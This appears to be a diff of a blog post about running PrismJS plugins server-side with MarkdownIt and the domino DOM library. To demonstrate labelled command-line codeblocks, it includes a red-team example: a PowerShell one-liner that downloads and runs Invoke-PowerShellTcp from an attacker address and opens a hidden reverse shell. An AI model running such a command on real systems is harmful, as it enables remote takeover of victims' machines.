@@ -10,9 +10,9 @@ tags:
 thumbnail_src: assets/thumbnail.jpg
 ---
 
-With over 7 million weekly downloads on NPM, PrismJS is one of the most widely used code highlighting packages in JavaScript, lauded for its unparalleled extensibility through plugins. But one recurring issue plagues developers: most plugins require a {% abbr "DOM", "document object model, responsible for managing the UI you see in your wonderful browser" %}! Fancy plugins such as `command-line`, `line-numbers`, and the toolbar-suite require a DOM to manipulate HTML. This isn't normally possible in runtime environments such as Node, which aren't designed to render UIs, hence, no DOM.
+With over 7 million weekly downloads on NPM, PrismJS is one of the most widely used code highlighting packages in JavaScript, lauded for its unparalleled extensibility through plugins. But one recurring issue plagues developers: most plugins require a {% abbr "DOM", "document object model, responsible for managing the UI you see in your wonderful browser" %}! Fancy plugins such as `command-line`, `line-numbers`, and the toolbar suite require a DOM to manipulate HTML. This isn't normally possible in runtime environments such as Node, which aren't designed to render UIs, hence, no DOM.
 
-In this post, I’ll demonstrate a few simple changes to easily coerce these plugins into compatibility with NodeJS and MarkdownIt, a popular markdown renderer.^[One workaround is to use regex to modify HTML — but let’s face it, I sleep more soundly knowing the current implementation is mature and battle-tested. By introducing a DOM API to Node, you're placing trust in a library to be spec-compliant. By handwriting regex, you're placing trust in your code to work. Which would you rather have?]
+In this post, I’ll demonstrate a few simple changes to easily coerce these plugins into compatibility with NodeJS and MarkdownIt, a popular markdown renderer.^[Instead of monkeypatching the environment (and potentially affecting other libraries), we could also just write new code using regex to modify HTML, removing the requirement for a DOM altogether. But let’s face it, I sleep more soundly knowing the current implementation is mature and battle-tested. By introducing a DOM API to Node, you're placing trust in a library to be spec-compliant. By handwriting regex, you're placing trust in your code (and regex!) to work. Which would you rather have?]
 
 ## Why enhance codeblocks?
 
@@ -20,7 +20,7 @@ Simple codeblocks suffice for most writers who need supporting text with pretty 
 
 To tell a good story, the characters, plot, and location need to be clear to the audience. Similarly, blog posts and tutorials benefit from enhancements such as command-line demarcations, line numbers, labels, and inline markup.
 
-There are many cases where such codeblocks are warranted:
+There are many cases where such codeblocks are warranted (brackets contain remedial plugins):
 
 - Interaction: input and output should be contrasted, think: shell or Jupyter notebook (command-line)
 - A post compares or demonstrates a technique in multiple languages (show-language)
@@ -29,12 +29,15 @@ There are many cases where such codeblocks are warranted:
 - A post refers to multiple files (label)
 
 {% details "Example: Catching Reverse Shells (Labels and Command-Line)" %}
-This is really useful when presenting narratives for red teaming scenarios, where multiple machines are involved. Here are some simple notes on catching a reverse shell from a Windows machine.
+This is really useful when presenting narratives for red teaming scenarios, where multiple machines are involved.^[Not that I have any red teaming writeups, but I foresee the possibility of such posts in the future.] Here are some simple notes on catching a reverse shell from a Windows machine.
 
 1. *Get our IP.*
 
-    ```shell {data-label=Attacker .command-line data-prompt="kali@kali $"}
+    ```shell {data-label=Attacker .command-line data-prompt="kali@kali $" data-output=2-10}
     ifconfig
+    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.100.100  netmask 255.255.255.0  broadcast 192.168.100.255
+        ...
     ```
 
 2. *Listen for incoming connections on port 4444.*
@@ -46,7 +49,7 @@ This is really useful when presenting narratives for red teaming scenarios, wher
 3. *Download and execute `Invoke-PowerShellTcp` on the victim.*
     
     ```powershell {data-label=Victim .command-line data-prompt="PS C:\>"}
-    powershell -nop -c "iex (New-Object Net.WebClient).DownloadString('http://{ATTACKER_IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {ATTACKER_IP} -Port 4444" 
+    powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.100.100/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.100.100 -Port 4444" 
     ```
 
 It's clear that our character shifts from Scene 1 to Scene 2, with less sentence clutter.
@@ -121,21 +124,30 @@ While MarkdownIt works great out-of-the-box, the default {% abbr "rendering", "R
 
 Prism has two primary highlight functions: `Prism.highlight` and `Prism.highlightElement`. Most server-side libraries are happy to use the former. But a lot of *hooks* aren't called by `.highlight`, so we'll also have to customise the renderer to call `.highlightElement`.
 
-We'll reference [MarkdownIt's default fence rule](https://github.com/markdown-it/markdown-it/blob/0fe7ccb4b7f30236fb05f623be6924961d296d3d/lib/renderer.mjs#L29) and customise it accordingly. (The full implementation can be found in [this site's repository](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/markdown-it/markdown-it-prism-adapter.js).)
+We'll reference [MarkdownIt's default fence rule](https://github.com/markdown-it/markdown-it/blob/0fe7ccb4b7f30236fb05f623be6924961d296d3d/lib/renderer.mjs#L29) and customise it accordingly.
 
 {% alert "danger" %}
-This will override the rule completely without reusing previous implementations. If you use another plugin which modifies and reuses the fence rule (e.g. `markdown-it-prism`), consider performing this overwrite first before calling the other plugin.
+The code presented below will override the `.renderer.rules.fence` rule completely, overwriting any previous implementations.
+
+If you use another plugin which reuses the fence rule (e.g. `markdown-it-prism`), consider calling code in this order: 1) the below code, 2) other code. This way no code is overwritten and lost.
 {% endalert %}
 
-1. Remove the default text-based highlighting `options.highlight`. We still escape the HTML since we'll substitute it in an HTML string.
-2. Handle `diff-*` languages by loading the right language.
-3. Wrap the escaped code in `<div><pre><code>` with the right attributes, convert it to a DOM element, highlight it to `Prism.highlightElement`, then return the rendered HTML.
+1. Remove the default text-based highlighting `options.highlight`. We still need to escape the HTML because we'll substitute it in a HTML string.
+2. (Optional, if you want `diff` support.) Handle `diff-*` languages by loading the right language.
+3. Wrap the escaped code in `<div><pre><code>` with the right attributes^[Normally, wrapping it in `<pre><code>` is sufficient. But some plugins such as toolbar will traverse up to the parent of `pre`, so... `<div><pre><code>`. Yay, more workarounds!], convert it to a DOM element, highlight it to `Prism.highlightElement`, then return the rendered HTML.
 4. We also moved the attributes to `<pre>` instead of `<code>`, which is required for PrismJS to function properly.
 
-```js
-markdownit.renderer.rules.fence = function (tokens, idx, options, _env, slf) {
-  ...
-}
+The most important part is step 3, where we call Prism magic with `.highlightElement`.
+
+```diff-js
+ markdownit.renderer.rules.fence = function (tokens, idx, options, _env, slf) {
+   ...
++  const result = `<div><pre${preAttrs}><code class="${codeClasses}">${escaped}</code></pre></div>`
++  const el = textToDOM(result)
++  Prism.highlightElement(el.firstChild.firstChild.firstChild)
++  return el.firstChild.firstChild.outerHTML
+   ...
+ }
 ```
 
 {% details "See Full Changes" %}
@@ -221,17 +233,17 @@ To add attributes to your codeblocks, introduce [`markdown-it-attrs`](https://gi
 
 You can now add attributes and classes to your codeblocks which will then be parsed by Prism.
 
-<pre class="language-md">
-<code>For instance, this becomes:
+For instance, this:
 
-```js {data-label=hello.js .inspect-me-lol}
+<pre class="language-md">
+<code>```js {data-label=hello.js .inspect-me-lol}
 function hello() {
   console.log("Hello world!");
 }
 ```</code>
 </pre>
 
-For instance, this becomes:
+becomes:
 
 ```js {data-label=hello.js .inspect-me-lol}
 function hello() {
@@ -240,7 +252,7 @@ function hello() {
 ```
 
 {% alert "warning" %}
-In 11ty, this is incompatible with `eleventy-plugin-syntaxhighlight` due to the way codeblocks are parsed.
+In 11ty, `markdown-it-attrs` is incompatible with `eleventy-plugin-syntaxhighlight` due to the way codeblocks are parsed.
 {% endalert %}
 
 ## Step 4: (Optional) Modify Plugins
@@ -249,10 +261,10 @@ With those two changes, we have all we need to start importing fancy plugins!
 
 In case you wish to fine-tune some plugins, you can always copy them into your local project and modify them directly! Some changes I made were:
 
-- modding `line-numbers` for compatibility with `command-line` and `diff` (Yes, this doesn't really make sense to present, but who knows if I'll need it in the future?)
+- modding `line-numbers` for compatibility with `command-line` and `diff` (Yes, this doesn't really make sense, but who knows if I'll need it in the future?)
 - modding `show-language` to display the base language when the highlight language is `diff-*`.
 
-You can also add custom attributes with some simple CSS! For instance, I added a CSS class which hides the command-line prompt when a `data-rw-prompt` attribute is specified.^[Here, rw stands for responsive width.] This may be useful for long prompts, which may cover the entire screen's width when scrolling on a phone.
+You can also add custom attributes with some simple CSS! For instance, I added a CSS class which hides the command-line prompt when a `data-rw-prompt` attribute is specified.^[Here, rw stands for responsive width.] This is useful for long prompts, which may cover the entire screen's width when scrolling on a phone.
 
 ```css
 @media (max-width: 576px) {
@@ -263,7 +275,7 @@ You can also add custom attributes with some simple CSS! For instance, I added a
 }
 ```
 
-And here it is in action on some notes. Try viewing on both mobile and computer.
+And here it is in action on some notes. Try viewing on both mobile and computer (or use your browser DevTools).
 
 ```powershell {.command-line data-rw-prompt data-prompt="PS C:\Users\Chris>" data-output=2-100}
 Get-DomainTrust -domain dollarcorp.moneycorp.local
@@ -282,11 +294,11 @@ WhenChanged     : 9/25/2024 10:12:06 PM
 
 Understandably, one major bottleneck in our strategy is DOM manipulation. A suitable library needs to parse HTML fragments, manipulate DOM elements, and create new ones.
 
-Although I originally selected JSDOM in my quick-n-dirty hack for its popularity, I later switched to domino for significant (2x!) speedup. This is based on a simple benchmark, which compares the three most popular(?) NodeJS DOM-manipulation libraries: [JSDOM](https://www.npmjs.com/package/jsdom), [domino](https://www.npmjs.com/package/domino), and [LinkeDOM](https://www.npmjs.com/package/linkedom).
+Although I originally selected JSDOM in my quick-n-dirty hack for its popularity, I later switched to domino for a significant (2x!) speedup. This is based on a simple benchmark, which compares the three most popular(?) NodeJS DOM-manipulation libraries: [JSDOM](https://www.npmjs.com/package/jsdom), [domino](https://www.npmjs.com/package/domino), and [LinkeDOM](https://www.npmjs.com/package/linkedom).
 
 {% image "assets/dom-benchmark.png", "jw-60 alpha-imgv", "Benchmark of time to render the ~400 codeblocks on this site with JSDOM, domino, and LinkeDOM." %}
 
-<sup>Benchmark of time to render the ~400 codeblocks on this site with JSDOM, domino, and LinkeDOM.</sup>
+<sup>Benchmark of time to render the ~400 codeblocks on this site with JSDOM, domino, and LinkeDOM. Lower time = faster.</sup>
 {.caption}
 
 | Library  | Mean (ms) | Min. (ms) | Max. (ms) |
@@ -330,3 +342,19 @@ Moreover, domino has 0 dependencies — it's basically written from the ground 
 ## Final Remarks
 
 I'll be the first to admit — this is a rather crude hack with some loose ends.^[It would be better to pass codeblock attributes directly to Prism without the extra stringification and parsing. Guess I'll leave this as an exercise for the front-end engineers.] But it works! Not to mention, it looks nice with enough CSS! And to some that's all that matters.
+
+For those interested in the code, you can check out the code here:
+
+* [module](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/markdown-it/markdown-it-prism-adapter.js)
+* [example usage](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/markdown.js#L74-L88)
+
+Just copy the module into your build and load it.
+
+Other mods:
+* copy-to-clipboard: [plugin](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/prism/prism-copy-to-clipboard.js) / [js](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/js.bundle/common/prism-copy-to-clipboard.js) / [css](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-custom.css)
+* line-numbers: [plugin](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/prism/prism-line-numbers.js) / [css](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-line-numbers.css)
+* show-language: [plugin](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/prism/prism-show-language.js)
+* command-line: [css](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-command-line.css)
+* toolbar: [css](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-toolbar.css)
+* diff: [css](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-diff.css) (based on a Eleventy customisation)
+
